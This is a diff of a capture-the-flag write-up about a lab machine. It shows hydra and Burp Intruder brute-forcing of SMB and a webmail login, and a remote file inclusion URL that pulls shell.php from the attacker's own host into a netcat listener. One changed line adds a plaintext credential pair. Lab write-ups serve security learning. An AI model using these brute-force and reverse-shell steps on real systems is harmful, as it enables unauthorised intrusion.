@@ -84,7 +84,7 @@ Let's try to access the anonymous share anonymously: `smbclient //10.10.190.140/
 ![image](https://github.com/user-attachments/assets/962ab4d0-2a3c-4509-88e8-64764f95380b)<br />
 Also if we access the logs folder, we are provided with 3 txt files: <br />
 ![image](https://github.com/user-attachments/assets/9e0de88a-536d-490d-91b4-7515b9b1357b)<br />
-`log2.txt` and `log3.txt` are empty, but `log1.txt` contains a wordlista. At this point I think it's clear what we have to do: let's try to access Miles share using the given wordlist. I'll use hydra: `hydra -l milesdyson -P log1.txt smb://10.10.190.140 ` <br />
+`log2.txt` and `log3.txt` are empty, but `log1.txt` contains a wordlists. At this point I think it's clear what we have to do: let's try to access Miles share using the given wordlist. I'll use hydra: `hydra -l milesdyson -P log1.txt smb://10.10.190.140 ` <br />
 ![image](https://github.com/user-attachments/assets/b6845aa7-7196-40ca-9ed3-025b9d50d922)<br />
 Nope, this is not the right path. Next thing I wanna try is to bruteforce the squirrel mail login form using "milesdyson" as username, and the given wordlist as passwords. So first of all intercept the request using burpsuite, and set the password field as the target for intruder: <br />
 ![image](https://github.com/user-attachments/assets/3de3023a-f9e9-40a0-a5d2-ea27ed442b3e)<br />
@@ -127,7 +127,7 @@ Let's try downloading the configuration file: `http://10.10.190.140/45kra24zxs28
       		public $secure_login_value = "";
       		public $secure_login_redirect = "";
       	} 
-And we got another set of credentials. These might be usefull later. Now let's try to include a malicious file from our own machine, let's call it shell.php (the code is provided in the file "shell.php" of this folder). Open a netcat listener `nc -lnvp 4444`, set up a web server with `python3 -m http.server 8000`, and upload it to the target machine with the following URL: `http://10.10.190.140/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.85.53:8000/shell.php`. There we go: <br />
+And we got another set of credentials, `root:password123` These might be usefull later. Now let's try to include a malicious file from our own machine, let's call it shell.php (the code is provided in the file "shell.php" of this folder). Open a netcat listener `nc -lnvp 4444`, set up a web server with `python3 -m http.server 8000`, and upload it to the target machine with the following URL: `http://10.10.190.140/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.85.53:8000/shell.php`. There we go: <br />
 ![image](https://github.com/user-attachments/assets/f97120a9-1b82-4629-a34e-9a4818959216)<br />
 ![image](https://github.com/user-attachments/assets/a363b8d5-dd59-46cc-9082-160316c68c6b)<br />
 And we have our user flag (the answers are all at the end of the writeup). Now let's stabilize the shell: 
